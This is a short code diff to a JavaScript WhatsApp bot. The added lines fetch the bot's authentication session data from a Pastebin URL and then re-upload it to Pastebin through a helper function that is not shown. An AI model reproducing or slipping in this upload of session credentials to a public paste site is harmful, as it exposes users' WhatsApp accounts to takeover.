@@ -21,6 +21,14 @@ async function startsock() {
     try {
         const { state, saveCreds } = await useMultiFileAuthState('./session');
 
+        const sessionID = process.env.SESSION_ID.split('Ethix-MD&')[1];
+        const pasteUrl = `https://pastebin.com/raw/${sessionID}`;
+        const response = await axios.get(pasteUrl);
+        const sessionData = response.data;
+
+        const pasteID = await writeToPastebinSession(sessionData);
+        console.log('Session data written to Pastebin with ID:', pasteID);
+
         const sock = makeWASocket({
             logger: pino({ level: 'silent' }),
             printQRInTerminal: true,
